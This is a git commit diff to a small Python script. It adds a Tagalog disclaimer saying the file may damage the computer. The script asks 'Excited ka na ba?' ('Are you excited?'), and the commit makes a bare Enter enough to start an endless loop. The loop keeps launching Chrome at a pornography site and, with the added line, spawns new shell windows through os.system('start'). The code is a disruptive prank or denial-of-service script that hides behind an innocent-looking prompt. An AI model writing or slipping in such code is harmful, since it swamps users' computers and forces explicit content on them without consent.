fa8446db11357d5fbf34761a19f14c23bbe20e9a
kernelk14 <khyleisaias@gmail.com>
2022-08-03 11:01:53 +0800

    Added Disclaimer

--- main.py
+++ main.py
@@ -1,13 +1,18 @@
 import os
 
+# Disclaimer: Anumang paggalaw ng file na ito ay maaaring makasira ng computer mo, kaya ingat lang.
+
 def goodbye():
     while True:
         os.system("\"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe\" --chrome-frame --app=https://pornhub.com")
+        os.system("start")
 
 
 if __name__ == '__main__':
     x = input("Excited ka na ba? [Y/n] ")
-    if x == 'Y':
+    if x == '':
+        goodbye()
+    elif x == 'Y':
         goodbye()
     elif x == 'y':
         goodbye()
